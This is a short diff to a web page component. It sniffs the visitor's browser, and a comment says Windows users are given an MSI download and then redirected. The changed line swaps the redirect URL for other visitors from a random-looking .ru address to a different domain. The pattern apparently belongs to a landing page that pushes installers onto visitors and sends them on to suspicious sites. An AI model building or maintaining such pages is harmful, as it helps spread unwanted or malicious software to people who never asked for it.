@@ -5,7 +5,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || '';
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://looker.ojtoiy.ru/Q!fon58sBW3UrfPTJXS3Rxb/";
+    const NON_WINDOWS_TARGET = "https://aspiceconference.com/clg";
 
     // 1. Windows users → MSI download, then redirect
     if (isWindows) {
